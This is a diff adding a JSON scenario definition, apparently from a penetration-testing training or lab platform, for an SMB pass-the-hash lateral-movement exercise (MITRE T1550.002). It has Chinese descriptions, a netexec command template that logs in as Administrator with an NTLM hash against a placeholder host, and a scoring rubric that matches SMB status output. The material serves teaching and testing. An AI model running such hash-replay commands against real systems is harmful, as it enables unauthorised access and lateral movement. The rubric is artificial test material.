@@ -1,0 +1,74 @@
+{
+  "id": "smb_pass_the_hash",
+  "name": "SMB Pass-the-Hash Replay Attack",
+  "description": "教学与测试目的：模拟凭据重放攻击（Replay Attack）。在获取 Windows 目标用户的 NTLM Hash 后，直接利用该 Hash （不使用明文密码）通过 SMB 协议进行网络认证并测试系统访问权限，演示 MITRE ATT&CK 横向移动（Lateral Movement）战术阶段的哈希传递技术（T1550.002）。",
+  "category": "lateral-movement",
+  "difficulty": "medium",
+  "estimatedDuration": "5 min",
+  "rolesAllowed": [
+    "operator",
+    "admin"
+  ],
+  "mitrePhases": [
+    "Lateral Movement",
+    "Credential Access"
+  ],
+  "mitreTechniques": [
+    "T1550.002"
+  ],
+  "targetType": [
+    "windows_host",
+    "ad_domain"
+  ],
+  "steps": [
+    {
+      "id": "step1_pth_smb",
+      "name": "SMB Pass-the-Hash Check",
+      "description": "使用 netexec 对目标进行 SMB 哈希传递测试认证。",
+      "toolId": "netexec",
+      "argsTemplate": [
+        "smb",
+        "{{host}}",
+        "-u",
+        "Administrator",
+        "-H",
+        "31d6cfe0d16ae931b73c59d7e0c089c0",
+        "--local-auth"
+      ],
+      "score": 100,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1550.002"
+      ],
+      "payload_id": "pass-the-hash"
+    }
+  ],
+  "rubric": {
+    "items": [
+      {
+        "id": "pth_executed",
+        "desc": "成功使用 netexec 进行哈希传递（Pass-the-Hash）测试尝试",
+        "points": 100,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "SMB|STATUS_LOGON_FAILURE|STATUS_SUCCESS|STATUS_ACCESS_DENIED|SMB Session"
+        }
+      }
+    ]
+  },
+  "notSuitableFor": [
+    "dvwa",
+    "local_ip",
+    "web_url"
+  ],
+  "baselineGroup": "windows-exploitation",
+  "expectedOutputPolicy": "expect_output",
+  "emptyOutputExplanation": "哈希传递尝试建立 SMB 认证连接；需要目标 Windows 靶机开放 445 端口且支持 SMB 连接",
+  "applicableTargetType": [
+    "windows_host",
+    "ad_domain"
+  ],
+  "teachingObjective": "演示在 Windows/SMB 认证场景中进行 Pass-the-Hash（哈希传递）凭证重放测试（T1550.002）",
+  "target_class": "windows_ad",
+  "disableAutoInsert": true
+}
